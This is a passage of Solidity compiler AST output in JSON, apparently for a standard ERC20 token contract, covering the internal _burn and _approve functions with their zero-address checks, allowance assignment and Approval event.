                  "src": "7473:15:8",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 803,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "7473:7:8",
                    "stateMutability": "nonpayable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 806,
                  "mutability": "mutable",
                  "name": "value",
                  "nameLocation": "7498:5:8",
                  "nodeType": "VariableDeclaration",
                  "scope": 834,
                  "src": "7490:13:8",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint256",
                    "typeString": "uint256"
                  },
                  "typeName": {
                    "id": 805,
                    "name": "uint256",
                    "nodeType": "ElementaryTypeName",
                    "src": "7490:7:8",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "7472:32:8"
            },
            "returnParameters": {
              "id": 808,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "7514:0:8"
            },
            "scope": 994,
            "src": "7458:208:8",
            "stateMutability": "nonpayable",
            "virtual": false,
            "visibility": "internal"
          },
          {
            "body": {
              "id": 866,
              "nodeType": "Block",
              "src": "8040:150:8",
              "statements": [
                {
                  "condition": {
                    "commonType": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    },
                    "id": 847,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftExpression": {
                      "id": 842,
                      "name": "account",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 837,
                      "src": "8054:7:8",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      }
                    },
                    "nodeType": "BinaryOperation",
                    "operator": "==",
                    "rightExpression": {
                      "arguments": [
                        {
                          "hexValue": "30",
                          "id": 845,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "8073:1:8",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_0_by_1",
                            "typeString": "int_const 0"
                          },
                          "value": "0"
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_rational_0_by_1",
                            "typeString": "int_const 0"
                          }
                        ],
                        "id": 844,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "lValueRequested": false,
                        "nodeType": "ElementaryTypeNameExpression",
                        "src": "8065:7:8",
                        "typeDescriptions": {
                          "typeIdentifier": "t_type$_t_address_$",
                          "typeString": "type(address)"
                        },
                        "typeName": {
                          "id": 843,
                          "name": "address",
                          "nodeType": "ElementaryTypeName",
                          "src": "8065:7:8",
                          "typeDescriptions": {}
                        }
                      },
                      "id": 846,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": true,
                      "kind": "typeConversion",
                      "lValueRequested": false,
                      "nameLocations": [],
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "8065:10:8",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      }
                    },
                    "src": "8054:21:8",
                    "typeDescriptions": {
                      "typeIdentifier": "t_bool",
                      "typeString": "bool"
                    }
                  },
                  "id": 856,
                  "nodeType": "IfStatement",
                  "src": "8050:89:8",
                  "trueBody": {
                    "id": 855,
                    "nodeType": "Block",
                    "src": "8077:62:8",
                    "statements": [
                      {
                        "errorCall": {
                          "arguments": [
                            {
                              "arguments": [
                                {
                                  "hexValue": "30",
                                  "id": 851,
                                  "isConstant": false,
                                  "isLValue": false,
                                  "isPure": true,
                                  "kind": "number",
                                  "lValueRequested": false,
                                  "nodeType": "Literal",
                                  "src": "8125:1:8",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_rational_0_by_1",
                                    "typeString": "int_const 0"
                                  },
                                  "value": "0"
                                }
                              ],
                              "expression": {
                                "argumentTypes": [
                                  {
                                    "typeIdentifier": "t_rational_0_by_1",
                                    "typeString": "int_const 0"
                                  }
                                ],
                                "id": 850,
                                "isConstant": false,
                                "isLValue": false,
                                "isPure": true,
                                "lValueRequested": false,
                                "nodeType": "ElementaryTypeNameExpression",
                                "src": "8117:7:8",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_type$_t_address_$",
                                  "typeString": "type(address)"
                                },
                                "typeName": {
                                  "id": 849,
                                  "name": "address",
                                  "nodeType": "ElementaryTypeName",
                                  "src": "8117:7:8",
                                  "typeDescriptions": {}
                                }
                              },
                              "id": 852,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "kind": "typeConversion",
                              "lValueRequested": false,
                              "nameLocations": [],
                              "names": [],
                              "nodeType": "FunctionCall",
                              "src": "8117:10:8",
                              "tryCall": false,
                              "typeDescriptions": {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            ],
                            "id": 848,
                            "name": "ERC20InvalidSender",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 359,
                            "src": "8098:18:8",
                            "typeDescriptions": {
                              "typeIdentifier": "t_function_error_pure$_t_address_$returns$__$",
                              "typeString": "function (address) pure"
                            }
                          },
                          "id": 853,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "functionCall",
                          "lValueRequested": false,
                          "nameLocations": [],
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "8098:30:8",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_tuple$__$",
                            "typeString": "tuple()"
                          }
                        },
                        "id": 854,
                        "nodeType": "RevertStatement",
                        "src": "8091:37:8"
                      }
                    ]
                  }
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 858,
                        "name": "account",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 837,
                        "src": "8156:7:8",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "arguments": [
                          {
                            "hexValue": "30",
                            "id": 861,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": true,
                            "kind": "number",
                            "lValueRequested": false,
                            "nodeType": "Literal",
                            "src": "8173:1:8",
                            "typeDescriptions": {
                              "typeIdentifier": "t_rational_0_by_1",
                              "typeString": "int_const 0"
                            },
                            "value": "0"
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_rational_0_by_1",
                              "typeString": "int_const 0"
                            }
                          ],
                          "id": 860,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "8165:7:8",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_$",
                            "typeString": "type(address)"
                          },
                          "typeName": {
                            "id": 859,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "8165:7:8",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 862,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "nameLocations": [],
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "8165:10:8",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 863,
                        "name": "value",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 839,
                        "src": "8177:5:8",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "id": 857,
                      "name": "_update",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 801,
                      "src": "8148:7:8",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
                        "typeString": "function (address,address,uint256)"
                      }
                    },
                    "id": 864,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "nameLocations": [],
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "8148:35:8",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 865,
                  "nodeType": "ExpressionStatement",
                  "src": "8148:35:8"
                }
              ]
            },
            "documentation": {
              "id": 835,
              "nodeType": "StructuredDocumentation",
              "src": "7672:307:8",
              "text": " @dev Destroys a `value` amount of tokens from `account`, lowering the total supply.\n Relies on the `_update` mechanism.\n Emits a {Transfer} event with `to` set to the zero address.\n NOTE: This function is not virtual, {_update} should be overridden instead"
            },
            "id": 867,
            "implemented": true,
            "kind": "function",
            "modifiers": [],
            "name": "_burn",
            "nameLocation": "7993:5:8",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 840,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 837,
                  "mutability": "mutable",
                  "name": "account",
                  "nameLocation": "8007:7:8",
                  "nodeType": "VariableDeclaration",
                  "scope": 867,
                  "src": "7999:15:8",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 836,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "7999:7:8",
                    "stateMutability": "nonpayable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 839,
                  "mutability": "mutable",
                  "name": "value",
                  "nameLocation": "8024:5:8",
                  "nodeType": "VariableDeclaration",
                  "scope": 867,
                  "src": "8016:13:8",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint256",
                    "typeString": "uint256"
                  },
                  "typeName": {
                    "id": 838,
                    "name": "uint256",
                    "nodeType": "ElementaryTypeName",
                    "src": "8016:7:8",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "7998:32:8"
            },
            "returnParameters": {
              "id": 841,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "8040:0:8"
            },
            "scope": 994,
            "src": "7984:206:8",
            "stateMutability": "nonpayable",
            "virtual": false,
            "visibility": "internal"
          },
          {
            "body": {
              "id": 884,
              "nodeType": "Block",
              "src": "8800:54:8",
              "statements": [
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 878,
                        "name": "owner",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 870,
                        "src": "8819:5:8",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 879,
                        "name": "spender",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 872,
                        "src": "8826:7:8",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 880,
                        "name": "value",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 874,
                        "src": "8835:5:8",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      {
                        "hexValue": "74727565",
                        "id": 881,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "bool",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "8842:4:8",
                        "typeDescriptions": {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        },
                        "value": "true"
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        },
                        {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        }
                      ],
                      "id": 877,
                      "name": "_approve",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [
                        885,
                        945
                      ],
                      "referencedDeclaration": 945,
                      "src": "8810:8:8",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$_t_bool_$returns$__$",
                        "typeString": "function (address,address,uint256,bool)"
                      }
                    },
                    "id": 882,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "nameLocations": [],
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "8810:37:8",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 883,
                  "nodeType": "ExpressionStatement",
                  "src": "8810:37:8"
                }
              ]
            },
            "documentation": {
              "id": 868,
              "nodeType": "StructuredDocumentation",
              "src": "8196:525:8",
              "text": " @dev Sets `value` as the allowance of `spender` over the `owner` s tokens.\n This internal function is equivalent to `approve`, and can be used to\n e.g. set automatic allowances for certain subsystems, etc.\n Emits an {Approval} event.\n Requirements:\n - `owner` cannot be the zero address.\n - `spender` cannot be the zero address.\n Overrides to this logic should be done to the variant with an additional `bool emitEvent` argument."
            },
            "id": 885,
            "implemented": true,
            "kind": "function",
            "modifiers": [],
            "name": "_approve",
            "nameLocation": "8735:8:8",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 875,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 870,
                  "mutability": "mutable",
                  "name": "owner",
                  "nameLocation": "8752:5:8",
                  "nodeType": "VariableDeclaration",
                  "scope": 885,
                  "src": "8744:13:8",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 869,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "8744:7:8",
                    "stateMutability": "nonpayable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 872,
                  "mutability": "mutable",
                  "name": "spender",
                  "nameLocation": "8767:7:8",
                  "nodeType": "VariableDeclaration",
                  "scope": 885,
                  "src": "8759:15:8",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 871,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "8759:7:8",
                    "stateMutability": "nonpayable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 874,
                  "mutability": "mutable",
                  "name": "value",
                  "nameLocation": "8784:5:8",
                  "nodeType": "VariableDeclaration",
                  "scope": 885,
                  "src": "8776:13:8",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint256",
                    "typeString": "uint256"
                  },
                  "typeName": {
                    "id": 873,
                    "name": "uint256",
                    "nodeType": "ElementaryTypeName",
                    "src": "8776:7:8",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "8743:47:8"
            },
            "returnParameters": {
              "id": 876,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "8800:0:8"
            },
            "scope": 994,
            "src": "8726:128:8",
            "stateMutability": "nonpayable",
            "virtual": false,
            "visibility": "internal"
          },
          {
            "body": {
              "id": 944,
              "nodeType": "Block",
              "src": "9799:334:8",
              "statements": [
                {
                  "condition": {
                    "commonType": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    },
                    "id": 902,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftExpression": {
                      "id": 897,
                      "name": "owner",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 888,
                      "src": "9813:5:8",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      }
                    },
                    "nodeType": "BinaryOperation",
                    "operator": "==",
                    "rightExpression": {
                      "arguments": [
                        {
                          "hexValue": "30",
                          "id": 900,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "9830:1:8",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_0_by_1",
                            "typeString": "int_const 0"
                          },
                          "value": "0"
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_rational_0_by_1",
                            "typeString": "int_const 0"
                          }
                        ],
                        "id": 899,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "lValueRequested": false,
                        "nodeType": "ElementaryTypeNameExpression",
                        "src": "9822:7:8",
                        "typeDescriptions": {
                          "typeIdentifier": "t_type$_t_address_$",
                          "typeString": "type(address)"
                        },
                        "typeName": {
                          "id": 898,
                          "name": "address",
                          "nodeType": "ElementaryTypeName",
                          "src": "9822:7:8",
                          "typeDescriptions": {}
                        }
                      },
                      "id": 901,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": true,
                      "kind": "typeConversion",
                      "lValueRequested": false,
                      "nameLocations": [],
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "9822:10:8",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      }
                    },
                    "src": "9813:19:8",
                    "typeDescriptions": {
                      "typeIdentifier": "t_bool",
                      "typeString": "bool"
                    }
                  },
                  "id": 911,
                  "nodeType": "IfStatement",
                  "src": "9809:89:8",
                  "trueBody": {
                    "id": 910,
                    "nodeType": "Block",
                    "src": "9834:64:8",
                    "statements": [
                      {
                        "errorCall": {
                          "arguments": [
                            {
                              "arguments": [
                                {
                                  "hexValue": "30",
                                  "id": 906,
                                  "isConstant": false,
                                  "isLValue": false,
                                  "isPure": true,
                                  "kind": "number",
                                  "lValueRequested": false,
                                  "nodeType": "Literal",
                                  "src": "9884:1:8",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_rational_0_by_1",
                                    "typeString": "int_const 0"
                                  },
                                  "value": "0"
                                }
                              ],
                              "expression": {
                                "argumentTypes": [
                                  {
                                    "typeIdentifier": "t_rational_0_by_1",
                                    "typeString": "int_const 0"
                                  }
                                ],
                                "id": 905,
                                "isConstant": false,
                                "isLValue": false,
                                "isPure": true,
                                "lValueRequested": false,
                                "nodeType": "ElementaryTypeNameExpression",
                                "src": "9876:7:8",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_type$_t_address_$",
                                  "typeString": "type(address)"
                                },
                                "typeName": {
                                  "id": 904,
                                  "name": "address",
                                  "nodeType": "ElementaryTypeName",
                                  "src": "9876:7:8",
                                  "typeDescriptions": {}
                                }
                              },
                              "id": 907,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "kind": "typeConversion",
                              "lValueRequested": false,
                              "nameLocations": [],
                              "names": [],
                              "nodeType": "FunctionCall",
                              "src": "9876:10:8",
                              "tryCall": false,
                              "typeDescriptions": {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            ],
                            "id": 903,
                            "name": "ERC20InvalidApprover",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 378,
                            "src": "9855:20:8",
                            "typeDescriptions": {
                              "typeIdentifier": "t_function_error_pure$_t_address_$returns$__$",
                              "typeString": "function (address) pure"
                            }
                          },
                          "id": 908,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "functionCall",
                          "lValueRequested": false,
                          "nameLocations": [],
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "9855:32:8",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_tuple$__$",
                            "typeString": "tuple()"
                          }
                        },
                        "id": 909,
                        "nodeType": "RevertStatement",
                        "src": "9848:39:8"
                      }
                    ]
                  }
                },
                {
                  "condition": {
                    "commonType": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    },
                    "id": 917,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftExpression": {
                      "id": 912,
                      "name": "spender",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 890,
                      "src": "9911:7:8",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      }
                    },
                    "nodeType": "BinaryOperation",
                    "operator": "==",
                    "rightExpression": {
                      "arguments": [
                        {
                          "hexValue": "30",
                          "id": 915,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "9930:1:8",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_0_by_1",
                            "typeString": "int_const 0"
                          },
                          "value": "0"
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_rational_0_by_1",
                            "typeString": "int_const 0"
                          }
                        ],
                        "id": 914,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "lValueRequested": false,
                        "nodeType": "ElementaryTypeNameExpression",
                        "src": "9922:7:8",
                        "typeDescriptions": {
                          "typeIdentifier": "t_type$_t_address_$",
                          "typeString": "type(address)"
                        },
                        "typeName": {
                          "id": 913,
                          "name": "address",
                          "nodeType": "ElementaryTypeName",
                          "src": "9922:7:8",
                          "typeDescriptions": {}
                        }
                      },
                      "id": 916,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": true,
                      "kind": "typeConversion",
                      "lValueRequested": false,
                      "nameLocations": [],
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "9922:10:8",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      }
                    },
                    "src": "9911:21:8",
                    "typeDescriptions": {
                      "typeIdentifier": "t_bool",
                      "typeString": "bool"
                    }
                  },
                  "id": 926,
                  "nodeType": "IfStatement",
                  "src": "9907:90:8",
                  "trueBody": {
                    "id": 925,
                    "nodeType": "Block",
                    "src": "9934:63:8",
                    "statements": [
                      {
                        "errorCall": {
                          "arguments": [
                            {
                              "arguments": [
                                {
                                  "hexValue": "30",
                                  "id": 921,
                                  "isConstant": false,
                                  "isLValue": false,
                                  "isPure": true,
                                  "kind": "number",
                                  "lValueRequested": false,
                                  "nodeType": "Literal",
                                  "src": "9983:1:8",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_rational_0_by_1",
                                    "typeString": "int_const 0"
                                  },
                                  "value": "0"
                                }
                              ],
                              "expression": {
                                "argumentTypes": [
                                  {
                                    "typeIdentifier": "t_rational_0_by_1",
                                    "typeString": "int_const 0"
                                  }
                                ],
                                "id": 920,
                                "isConstant": false,
                                "isLValue": false,
                                "isPure": true,
                                "lValueRequested": false,
                                "nodeType": "ElementaryTypeNameExpression",
                                "src": "9975:7:8",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_type$_t_address_$",
                                  "typeString": "type(address)"
                                },
                                "typeName": {
                                  "id": 919,
                                  "name": "address",
                                  "nodeType": "ElementaryTypeName",
                                  "src": "9975:7:8",
                                  "typeDescriptions": {}
                                }
                              },
                              "id": 922,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "kind": "typeConversion",
                              "lValueRequested": false,
                              "nameLocations": [],
                              "names": [],
                              "nodeType": "FunctionCall",
                              "src": "9975:10:8",
                              "tryCall": false,
                              "typeDescriptions": {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            ],
                            "id": 918,
                            "name": "ERC20InvalidSpender",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 383,
                            "src": "9955:19:8",
                            "typeDescriptions": {
                              "typeIdentifier": "t_function_error_pure$_t_address_$returns$__$",
                              "typeString": "function (address) pure"
                            }
                          },
                          "id": 923,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "functionCall",
                          "lValueRequested": false,
                          "nameLocations": [],
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "9955:31:8",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_tuple$__$",
                            "typeString": "tuple()"
                          }
                        },
                        "id": 924,
                        "nodeType": "RevertStatement",
                        "src": "9948:38:8"
                      }
                    ]
                  }
                },
                {
                  "expression": {
                    "id": 933,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "baseExpression": {
                        "baseExpression": {
                          "id": 927,
                          "name": "_allowances",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 508,
                          "src": "10006:11:8",
                          "typeDescriptions": {
                            "typeIdentifier": "t_mapping$_t_address_$_t_mapping$_t_address_$_t_uint256_$_$",
                            "typeString": "mapping(address => mapping(address => uint256))"
                          }
                        },
                        "id": 930,
                        "indexExpression": {
                          "id": 928,
                          "name": "owner",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 888,
                          "src": "10018:5:8",
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        },
                        "isConstant": false,
                        "isLValue": true,
                        "isPure": false,
                        "lValueRequested": false,
                        "nodeType": "IndexAccess",
                        "src": "10006:18:8",
                        "typeDescriptions": {
                          "typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
                          "typeString": "mapping(address => uint256)"
                        }
                      },
                      "id": 931,
                      "indexExpression": {
                        "id": 929,
                        "name": "spender",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 890,
                        "src": "10025:7:8",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      "isConstant": false,
                      "isLValue": true,
                      "isPure": false,
                      "lValueRequested": true,
                      "nodeType": "IndexAccess",
                      "src": "10006:27:8",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "id": 932,
                      "name": "value",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 892,
                      "src": "10036:5:8",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      }
                    },
                    "src": "10006:35:8",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "id": 934,
                  "nodeType": "ExpressionStatement",
                  "src": "10006:35:8"
                },
                {
                  "condition": {
                    "id": 935,
                    "name": "emitEvent",
                    "nodeType": "Identifier",
                    "overloadedDeclarations": [],
                    "referencedDeclaration": 894,
                    "src": "10055:9:8",
                    "typeDescriptions": {
                      "typeIdentifier": "t_bool",
                      "typeString": "bool"
                    }
                  },
                  "id": 943,
                  "nodeType": "IfStatement",
                  "src": "10051:76:8",
                  "trueBody": {
                    "id": 942,
                    "nodeType": "Block",
                    "src": "10066:61:8",
                    "statements": [
                      {
                        "eventCall": {
                          "arguments": [
                            {
                              "id": 937,
                              "name": "owner",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": 888,
                              "src": "10094:5:8",
                              "typeDescriptions": {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            },
                            {
                              "id": 938,
                              "name": "spender",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": 890,
                              "src": "10101:7:8",
                              "typeDescriptions": {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            },
                            {
                              "id": 939,
                              "name": "value",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": 892,
                              "src": "10110:5:8",
                              "typeDescriptions": {
                                "typeIdentifier": "t_uint256",
                                "typeString": "uint256"
                              }
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              },
                              {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              },
                              {
                                "typeIdentifier": "t_uint256",
                                "typeString": "uint256"
                              }
                            ],
                            "id": 936,
                            "name": "Approval",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 1015,
                            "src": "10085:8:8",
                            "typeDescriptions": {
